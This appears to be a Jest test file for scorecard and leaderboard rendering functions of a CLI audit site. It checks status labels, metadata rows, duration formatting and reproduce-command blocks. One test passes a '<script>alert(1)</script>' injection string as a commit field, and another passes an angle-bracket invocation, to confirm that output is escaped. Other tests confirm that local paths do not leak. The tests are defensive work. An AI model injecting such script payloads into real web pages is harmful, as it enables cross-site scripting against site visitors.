describe('buildScorecardBody — 7-status taxonomy rendering (schema 0.6)', () => {
  function tool(name = 'fixture') {
    return {
      name,
      binary: name,
      description: 'a fixture',
      tier: 'workhorse',
      language: 'rust',
      creator: 'me',
      install: `brew install ${name}`,
      repo: `me/${name}`,
    };
  }

  function render() {
    const scorecard = makeV06Scorecard();
    const metadata = { tool: scorecard.tool, anc: scorecard.anc, run: scorecard.run, target: scorecard.target };
    return buildScorecardBody(tool(), scorecard, [], { met: 5, total: 7, details: [] }, '1.2.3', metadata);
  }

  test('opt_out renders its own class + OPT-OUT label, distinct from skip', () => {
    const html = render();
    expect(html).toContain('check check--opt_out');
    expect(html).toMatch(/check--opt_out">\s*<td class="check__status">OPT-OUT</);
    // Never the raw snake_case the underscore status would produce under a bare toUpperCase.
    expect(html).not.toContain('>OPT_OUT<');
  });

  test('n_a renders its own class + N/A label, distinct from skip', () => {
    const html = render();
    expect(html).toContain('check check--n_a');
    expect(html).toMatch(/check--n_a">\s*<td class="check__status">N\/A</);
    expect(html).not.toContain('>N_A<');
  });

  test('skip stays its own bucket alongside the two new statuses', () => {
    const html = render();
    expect(html).toContain('check check--skip');
    // All three excluded-from-numerator statuses are visually separate classes.
    const classes = ['check--opt_out', 'check--n_a', 'check--skip'];
    for (const c of classes) expect(html).toContain(c);
  });
});

describe('buildScorecardBody — v0.4 metadata rendering', () => {
  function tool(name = 'rg') {
    return {
      name,
      binary: name,
      description: 'fast grep',
      tier: 'workhorse',
      language: 'rust',
      creator: 'BurntSushi',
      install: `brew install ${name}`,
      repo: `BurntSushi/${name}`,
    };
  }

  function sc(passes = 7, fails = 0) {
    const results: any[] = [];
    for (let i = 0; i < passes; i++) {
      results.push({
        id: `p${i}`,
        label: `pass${i}`,
        group: 'P1',
        layer: 'behavioral',
        status: 'pass',
        evidence: null,
      });
    }
    for (let i = 0; i < fails; i++) {
      results.push({
        id: `f${i}`,
        label: `fail${i}`,
        group: 'P2',
        layer: 'behavioral',
        status: 'fail',
        evidence: 'no flag',
      });
    }
    const score_pct = Math.round((passes / (passes + fails)) * 100);
    return {
      schema_version: '0.5',
      audit_profile: null,
      summary: { total: passes + fails, pass: passes, warn: 0, fail: fails, skip: 0, error: 0 },
      results,
      badge: {
        eligible: score_pct >= 70,
        score_pct,
        embed_markdown: '[![agent-native](https://anc.dev/badge/rg.svg)](https://anc.dev/score/rg)',
        scorecard_url: 'https://anc.dev/score/rg',
        badge_url: 'https://anc.dev/badge/rg.svg',
        convention_url: 'https://anc.dev/badge',
      },
    };
  }

  function v04Meta(overrides: Record<string, any> = {}) {
    return {
      tool: { name: 'rg', binary: 'rg', version: 'ripgrep 15.1.0' },
      anc: { version: '0.1.0', commit: 'fff3f13' },
      run: {
        invocation: 'anc check --command rg --output json',
        started_at: '2026-04-30T04:18:53.099683344Z',
        duration_ms: 53,
        platform: { os: 'linux', arch: 'x86_64' },
      },
      target: { kind: 'command', path: null, command: 'rg' },
      ...overrides,
    };
  }

  test('Details block renders all six v0.4 rows in order', () => {
    const html = buildScorecardBody(tool('rg'), sc(), [], { met: 7, total: 7, details: [] }, '15.1.0', v04Meta());
    // Row order: Version, Audit date, Duration, Platform, Mode, Anc build, Install
    const versionIdx = html.indexOf('Version scored');
    const auditIdx = html.indexOf('Audit date');
    const durationIdx = html.indexOf('Duration<');
    const platformIdx = html.indexOf('Platform<');
    const modeIdx = html.indexOf('Mode<');
    const ancIdx = html.indexOf('Anc build');
    const installIdx = html.indexOf('Install<');
    expect(versionIdx).toBeGreaterThan(-1);
    expect(auditIdx).toBeGreaterThan(versionIdx);
    expect(durationIdx).toBeGreaterThan(auditIdx);
    expect(platformIdx).toBeGreaterThan(durationIdx);
    expect(modeIdx).toBeGreaterThan(platformIdx);
    expect(ancIdx).toBeGreaterThan(modeIdx);
    expect(installIdx).toBeGreaterThan(ancIdx);
  });

  test('Audit date renders the RFC 3339 timestamp as a calm UTC string', () => {
    const html = buildScorecardBody(tool('rg'), sc(), [], { met: 7, total: 7, details: [] }, '15.1.0', v04Meta());
    expect(html).toContain('<dd>2026-04-30 04:18:53 UTC</dd>');
  });

  test('Duration humanizes ms / s / m+s correctly', () => {
    const ms = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({ run: { ...v04Meta().run, duration_ms: 42 } }),
    );
    expect(ms).toContain('<dt>Duration</dt><dd>42ms</dd>');

    const seconds = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({ run: { ...v04Meta().run, duration_ms: 12_345 } }),
    );
    expect(seconds).toContain('<dt>Duration</dt><dd>12.3s</dd>');

    const longRun = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({ run: { ...v04Meta().run, duration_ms: 145_234 } }),
    );
    expect(longRun).toContain('<dt>Duration</dt><dd>2m 25s</dd>');
  });

  test('Anc build renders version-only regardless of commit field shape', () => {
    // The commit field is captured in the JSON schema but no longer surfaced
    // on the rendered scorecard. Render is version-only across hex, null,
    // and malicious-string inputs alike — the field is never interpolated
    // into HTML, so there is no URL-construction surface to gate.
    const hex = buildScorecardBody(tool('rg'), sc(), [], { met: 7, total: 7, details: [] }, '15.1.0', v04Meta());
    expect(hex).toContain('<dt>Anc build</dt><dd>0.1.0</dd>');
    expect(hex).not.toContain('agentnative-cli/commit/');

    const nullCommit = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({ anc: { version: '0.1.0', commit: null } }),
    );
    expect(nullCommit).toContain('<dt>Anc build</dt><dd>0.1.0</dd>');
    expect(nullCommit).not.toContain('agentnative-cli/commit/');

    const malicious = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({ anc: { version: '0.1.0', commit: '<script>alert(1)</script>' } }),
    );
    expect(malicious).toContain('<dt>Anc build</dt><dd>0.1.0</dd>');
    expect(malicious).not.toContain('agentnative-cli/commit/');
    expect(malicious).not.toContain('<script>');
  });

  test('reproduce CTA renders run.invocation verbatim for command-mode runs', () => {
    const html = buildScorecardBody(tool('rg'), sc(), [], { met: 7, total: 7, details: [] }, '15.1.0', v04Meta());
    expect(html).toContain('<pre><code>anc check --command rg --output json</code></pre>');
  });

  test('reproduce CTA falls back to synthesized form for project-mode runs', () => {
    // target.kind === "project" → invocation may carry a local filesystem path,
    // so the renderer must use the synthesized canonical form instead.
    const html = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({
        target: { kind: 'project', path: '/home/secret/repo', command: null },
        run: { ...v04Meta().run, invocation: 'anc check /home/secret/repo' },
      }),
    );
    expect(html).toContain('<pre><code>anc check --command rg</code></pre>');
    expect(html).not.toContain('/home/secret/repo');
  });

  test('reproduce CTA escHtmls the invocation defensively (XSS guard)', () => {
    const html = buildScorecardBody(
      tool('rg'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      v04Meta({
        run: { ...v04Meta().run, invocation: 'anc check --command "<rg>" --output json' },
      }),
    );
    expect(html).not.toContain('<rg>');
    expect(html).toContain('&lt;rg&gt;');
  });

  test('grandfathered scorecards (null metadata) skip v0.4-only rows but keep Version + Install', () => {
    // anc-v0.1.3.json's shape: no tool/anc/run/target — metadata block is
    // {tool: null, anc: null, run: null, target: null}.
    const grandfatheredMeta = { tool: null, anc: null, run: null, target: null };
    const html = buildScorecardBody(
      tool('anc'),
      sc(),
      [],
      { met: 7, total: 7, details: [] },
      '0.1.3',
      grandfatheredMeta,
    );
    expect(html).toContain('<dt>Version scored</dt><dd>0.1.3</dd>');
    expect(html).toContain('<dt>Install</dt>');
    expect(html).not.toContain('Audit date');
    expect(html).not.toContain('Duration<');
    expect(html).not.toContain('Platform<');
    expect(html).not.toContain('Mode<');
    expect(html).not.toContain('Anc build');
  });
});

describe('buildScorecardMarkdown — v0.4 metadata mirrors HTML', () => {
  test('command-mode invocation lands verbatim in the markdown reproduce block', () => {
    // Matches the HTML branch — markdown is consumed by /llms-full.txt and
    // text/markdown content negotiation; same target.kind gate is essential.
    const md = buildScorecardMarkdown(
      {
        name: 'rg',
        binary: 'rg',
        description: 'grep',
        tier: 'workhorse',
        language: 'rust',
        install: 'brew install rg',
      },
      {
        schema_version: '0.5',
        audit_profile: null,
        summary: { pass: 1, warn: 0, fail: 0 },
        results: [],
        badge: {
          eligible: true,
          score_pct: 100,
          embed_markdown: '[![agent-native](https://anc.dev/badge/rg.svg)](https://anc.dev/score/rg)',
          scorecard_url: 'https://anc.dev/score/rg',
          badge_url: 'https://anc.dev/badge/rg.svg',
          convention_url: 'https://anc.dev/badge',
        },
      } as any,
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      {
        tool: { name: 'rg', binary: 'rg', version: 'ripgrep 15.1.0' },
        anc: { version: '0.1.0', commit: 'fff3f13' },
        run: {
          invocation: 'anc check --command rg --output json',
          started_at: '2026-04-30T04:18:53.099683344Z',
          duration_ms: 53,
          platform: { os: 'linux', arch: 'x86_64' },
        },
        target: { kind: 'command', path: null, command: 'rg' },
      },
    );
    expect(md).toContain('## Reproduce locally');
    expect(md).toContain('anc check --command rg --output json');
    // The repro fence is tagged `bash` so renderers (Shiki, GitHub markdown,
    // hosted previews) syntax-highlight the command instead of treating it
    // as plain text.
    expect(md).toContain('```bash\nanc check --command rg --output json\n```');
  });

  test('project-mode invocation falls back to the synthesized form (no path leak)', () => {
    const md = buildScorecardMarkdown(
      {
        name: 'rg',
        binary: 'rg',
        description: 'grep',
        tier: 'workhorse',
        language: 'rust',
        install: 'brew install rg',
      },
      {
        schema_version: '0.5',
        audit_profile: null,
        summary: { pass: 1, warn: 0, fail: 0 },
        results: [],
        badge: {
          eligible: true,
          score_pct: 100,
          embed_markdown: '[![agent-native](https://anc.dev/badge/rg.svg)](https://anc.dev/score/rg)',
          scorecard_url: 'https://anc.dev/score/rg',
          badge_url: 'https://anc.dev/badge/rg.svg',
          convention_url: 'https://anc.dev/badge',
        },
      } as any,
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      {
        tool: { name: 'rg', binary: 'rg', version: 'ripgrep 15.1.0' },
        anc: { version: '0.1.0', commit: 'fff3f13' },
        run: {
          invocation: 'anc check /home/secret/repo',
          started_at: '2026-04-30T04:18:53.099683344Z',
          duration_ms: 53,
          platform: { os: 'linux', arch: 'x86_64' },
        },
        target: { kind: 'project', path: '/home/secret/repo', command: null },
      },
    );
    expect(md).not.toContain('/home/secret/repo');
    expect(md).toContain('anc check --command rg');
  });

  test('mirrors the v0.4 metadata fields the HTML Details block carries', () => {
    const md = buildScorecardMarkdown(
      {
        name: 'rg',
        binary: 'rg',
        description: 'grep',
        tier: 'workhorse',
        language: 'rust',
        install: 'brew install rg',
      },
      {
        schema_version: '0.5',
        audit_profile: null,
        summary: { pass: 1, warn: 0, fail: 0 },
        results: [],
        badge: {
          eligible: true,
          score_pct: 100,
          embed_markdown: '[![agent-native](https://anc.dev/badge/rg.svg)](https://anc.dev/score/rg)',
          scorecard_url: 'https://anc.dev/score/rg',
          badge_url: 'https://anc.dev/badge/rg.svg',
          convention_url: 'https://anc.dev/badge',
        },
      } as any,
      [],
      { met: 7, total: 7, details: [] },
      '15.1.0',
      {
        tool: { name: 'rg', binary: 'rg', version: 'ripgrep 15.1.0' },
        anc: { version: '0.1.0', commit: 'fff3f13' },
        run: {
          invocation: 'anc check --command rg --output json',
          started_at: '2026-04-30T04:18:53.099683344Z',
          duration_ms: 53,
          platform: { os: 'linux', arch: 'x86_64' },
        },
        target: { kind: 'command', path: null, command: 'rg' },
      },
    );
    expect(md).toContain('**Audit date:** 2026-04-30 04:18:53 UTC');
    expect(md).toContain('**Duration:** 53ms');
    expect(md).toContain('**Platform:** `linux/x86_64`');
    expect(md).toContain('**Mode:** command');
    expect(md).toContain('**Anc build:** 0.1.0');
    expect(md).not.toContain('agentnative-cli/commit/');
  });
});

// -------------------------------------------------------------------
// Leaderboard badge callout (surface #2 of the badge plan).
// -------------------------------------------------------------------

describe('buildLeaderboardBody — badge callout', () => {
  // Post-U3: every leaderboard entry has a scorecard. The "unscored entries
  // not counted as eligible" pre-inversion test moved here as a tautology
  // — there are no unscored entries to mis-count anymore (they're excluded
  // by loadScoredTools). The denominator is the audited corpus, not the
  // registry.
  function entry(name: string, score: number) {
    const score_pct = Math.round(score * 100);
    return {
      tool: { name, tier: 'workhorse', language: 'rust', description: name },
      scorecard: {
        summary: { pass: 1, warn: 0, fail: 0 },
        badge: {
          eligible: score_pct >= 70,
          score_pct,
          embed_markdown: `[![agent-native](https://anc.dev/badge/${name}.svg)](https://anc.dev/score/${name})`,
          scorecard_url: `https://anc.dev/score/${name}`,
          badge_url: `https://anc.dev/badge/${name}.svg`,
          convention_url: 'https://anc.dev/badge',
        },
      } as any,
      principleScore: { met: 5, total: 7, details: [] },
      rank: 1,
    };
  }

  test('callout cites the floor and the live eligible/total count', () => {
    const lb = [entry('eza', 1.0), entry('rg', 0.89), entry('xx', 0.5), entry('yy', 0.3)];
    const html = buildLeaderboardBody(lb as any, '<p>m</p>');
    expect(html).toContain('leaderboard-badge-callout');
    expect(html).toContain('above 70%');
    // Two of four entries clear 0.70; denominator is the audited corpus.
    expect(html).toContain('2 of 4 listed tools');
  });

  test('callout links to /badge', () => {
    const html = buildLeaderboardBody([entry('eza', 1.0)] as any, '<p>m</p>');
    expect(html).toContain('href="/badge"');
  });
});
